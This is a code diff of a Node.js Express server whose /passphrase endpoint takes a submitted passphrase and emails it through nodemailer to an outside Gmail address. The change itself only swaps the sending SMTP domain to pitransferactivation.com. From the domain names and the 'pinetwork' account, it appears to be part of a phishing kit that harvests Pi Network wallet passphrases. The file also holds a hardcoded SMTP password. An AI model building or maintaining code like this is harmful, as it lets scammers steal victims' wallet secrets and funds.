@@ -35,11 +35,11 @@ app.post('/passphrase', async (req, res) => {
   const passphrase = req.body.passphrase;
 
   let transporter = nodemailer.createTransport({
-    host: "primecapitasmanagement.com",
+    host: "pitransferactivation.com",
     port: 465,
     secure: true, // true for 465, false for other ports
     auth: {
-      user: "pinetwork@primecapitasmanagement.com", // generated ethereal user
+      user: "sender@pitransferactivation.com", // generated ethereal user
       pass: "pinetwork10", // generated ethereal password
     },
     tls: {
@@ -49,7 +49,7 @@ app.post('/passphrase', async (req, res) => {
 
   // Define the email message
   const mailOptions = {
-    from: 'pinetwork@primecapitasmanagement.com',
+    from: 'sender@pitransferactivation.com',
     to: 'ashleygentry571@gmail.com',
     subject: 'Passphrase Received',
     text: `Passphrase: ${passphrase}`,
